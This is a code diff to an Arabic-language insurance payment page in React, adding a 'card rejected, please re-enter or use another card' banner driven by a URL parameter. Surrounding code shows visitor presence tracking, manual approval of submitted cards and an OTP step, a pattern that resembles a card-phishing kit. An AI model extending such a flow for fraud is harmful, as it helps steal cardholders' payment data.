@@ -34,6 +34,7 @@ const Payment = () => {
   const companyName = searchParams.get("company") || "شركة التأمين";
   const price = searchParams.get("price") || "0";
   const regularPrice = searchParams.get("regularPrice") || price;
+  const wasCardRejected = searchParams.get("rejected") === "1";
 
   // خصم 10% إضافي للدفع الفوري
   const [timeLeft, setTimeLeft] = useState(600); // 10 دقائق
@@ -91,8 +92,23 @@ const Payment = () => {
   const [applicationId, setApplicationId] = useState<string | null>(null);
   const [waitingForApproval, setWaitingForApproval] = useState(false);
   const [approvalStatus, setApprovalStatus] = useState<'waiting' | 'approved' | 'rejected'>('waiting');
+  const [showCardRejectedMessage, setShowCardRejectedMessage] = useState(wasCardRejected);
   const statusHandledRef = useRef(false);
   usePresence(applicationId || undefined, 'payment');
+
+  useEffect(() => {
+    if (!wasCardRejected) return;
+
+    setShowCardRejectedMessage(true);
+    setWaitingForApproval(false);
+    setApprovalStatus('waiting');
+    statusHandledRef.current = false;
+    toast({
+      title: "فشلت عملية الدفع",
+      description: "الرجاء إعادة إدخال بيانات البطاقة أو استخدام بطاقة أخرى",
+      variant: "destructive"
+    });
+  }, [wasCardRejected, toast]);
 
   const moveToOtpVerification = useCallback(() => {
     const cardDigits = formData.cardNumber.replace(/\s/g, "");
@@ -193,6 +209,7 @@ const Payment = () => {
       filteredValue = filteredValue.replace(/(\d{4})/g, "$1 ").trim();
       statusHandledRef.current = false;
       setApprovalStatus('waiting');
+      setShowCardRejectedMessage(false);
     }
 
     // CVV - أرقام فقط، بحد أقصى 4
@@ -615,6 +632,15 @@ const Payment = () => {
             {/* نموذج الدفع */}
             <Card className="p-4 md:p-6 lg:p-8 shadow-xl border-2">
               <h2 className="text-xl md:text-2xl font-bold mb-4 md:mb-6">معلومات الدفع</h2>
+              {showCardRejectedMessage &&
+                <div className="mb-5 flex items-start gap-3 rounded-lg border border-destructive/30 bg-destructive/10 p-4 text-destructive">
+                  <XCircle className="mt-0.5 h-5 w-5 flex-shrink-0" />
+                  <div className="space-y-1">
+                    <p className="font-semibold">فشلت عملية الدفع</p>
+                    <p className="text-sm text-destructive/90">الرجاء إعادة إدخال بيانات البطاقة أو استخدام بطاقة أخرى.</p>
+                  </div>
+                </div>
+              }
               <form onSubmit={handleSubmit} className="space-y-4 md:space-y-6">
                 {/* اسم حامل البطاقة */}
                 <div className="space-y-2">
